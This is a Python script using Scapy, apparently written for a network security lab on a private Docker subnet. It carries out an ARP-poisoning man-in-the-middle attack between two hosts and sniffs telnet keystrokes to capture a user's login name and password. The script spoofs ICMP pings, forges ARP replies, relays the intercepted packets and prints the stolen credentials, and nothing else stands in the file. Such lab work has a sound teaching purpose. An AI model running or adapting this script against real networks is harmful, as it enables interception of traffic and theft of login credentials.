from scapy.all import *
import socket
import time

hostA_IP = '10.9.0.5'
hostB_IP = '10.9.0.6'
attacker_IP = '10.9.0.1'
random_IP = '10.9.0.7'
hostA_MAC = '02:42:0a:09:00:05'
hostB_MAC = '02:42:0a:09:00:06'
attacker_MAC = '02:42:e9:d4:2c:fa'
interface = 'br-4886ec97ed5e'

username = []
return_cnt = 0
password = []
credentials_captured = False

def spoof(spoof_ip, target_ip):
    spoofed_pckt = Ether()/IP(src=spoof_ip, dst=target_ip)/ICMP()
    sendp(spoofed_pckt, iface= interface)
    
def poison_arp(spoof_ip, spoof_mac, target_ip, target_mac):
    # spoof an ARP reply to poison the ARP table
    arp_reply = Ether()/ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac, hwsrc=spoof_mac)
    sendp(arp_reply, iface=interface)
    print(f'ARP reply sent - poisoning complete: {arp_reply.summary()}')

def mitm():
    # spoof an ICMP ping to Host B with Host A's IP address to create ARP entry
    spoof(hostA_IP, hostB_IP)
    # wait one second
    time.sleep(1)
    # map Host A's IP Address to the attacker MAC in Host B's ARP table
    poison_arp(hostA_IP, attacker_MAC, hostB_IP, hostB_MAC)

    # spoof an ICMP ping to Host A with Host B's IP address to create ARP entry
    spoof(hostB_IP, hostA_IP)
    # wait one second
    time.sleep(1)
    # map Host B's IP Address to the attacker MAC in Host A's ARP table
    poison_arp(hostB_IP, attacker_MAC, hostA_IP, hostA_MAC)
    

def is_telnet_traffic(pckt):
    return pckt.haslayer(Raw) and pckt.haslayer(IP) and (pckt[IP].dst == hostB_IP or pckt[IP].src == hostB_IP)

def is_client_keystroke(pckt):
    return pckt.haslayer(Raw) and pckt.haslayer(IP) and pckt[IP].src == hostA_IP and pckt[IP].dst == hostB_IP

def forward_packet(pckt):
    if pckt.haslayer(IP):
        # Forward packet to its intended destination
        if pckt[IP].dst == hostA_IP:
            # Packet going to Host A, set correct MAC
            pckt[Ether].dst = hostA_MAC
        elif pckt[IP].dst == hostB_IP:
            # Packet going to Host B, set correct MAC  
            pckt[Ether].dst = hostB_MAC
        
        # Set source MAC to attacker MAC (we're the relay)
        pckt[Ether].src = attacker_MAC
        sendp(pckt, iface=interface, verbose=False)

def print_user_pass():
    u = "".join(username)
    p = "".join(password)
    print(f'Username: {u}')
    print(f'Password: {p}')

def print_pckt(pckt):
    global username, password, return_cnt, credentials_captured
    
    # Forward the packet first to keep connection alive
    forward_packet(pckt)
    
    # Only process keystrokes from client (Host A) to server (Host B)
    if not is_client_keystroke(pckt) or credentials_captured:
        return
    
    if pckt.haslayer(Raw):
        byte_data = pckt[Raw].load
        if byte_data == b'\r\x00':
            return_cnt += 1
        elif not byte_data.startswith(b'\xff'):
            try:
                text = byte_data.decode('utf-8', errors='ignore')
                if text.strip():
                    if return_cnt == 0:
                        username.append(text)
                    else:
                        password.append(text)
            except:
                pass
        if return_cnt == 2 and not credentials_captured:
            print_user_pass()
            credentials_captured = True

if __name__ == "__main__":
    # Step 1: Create initial ARP entry by spoofing ping from random IP to Host A
    print("Step 1: Creating initial ARP entry...")
    spoof(random_IP, hostA_IP)
    time.sleep(1)
    
    # Step 2: Poison Host A's ARP table to map random IP to attacker MAC
    print("Step 2: Poisoning Host A's ARP table...")
    poison_arp(random_IP, attacker_MAC, hostA_IP, hostA_MAC)
    time.sleep(1)
    
    # Step 3: Perform full MiTM attack between Host A and Host B
    print("Step 3: Performing MiTM attack...")
    mitm()
    
    # Step 4: Start sniffing telnet traffic
    print("Step 4: Sniffing telnet traffic...")
    sniff(iface=interface, lfilter=is_telnet_traffic, prn=print_pckt)
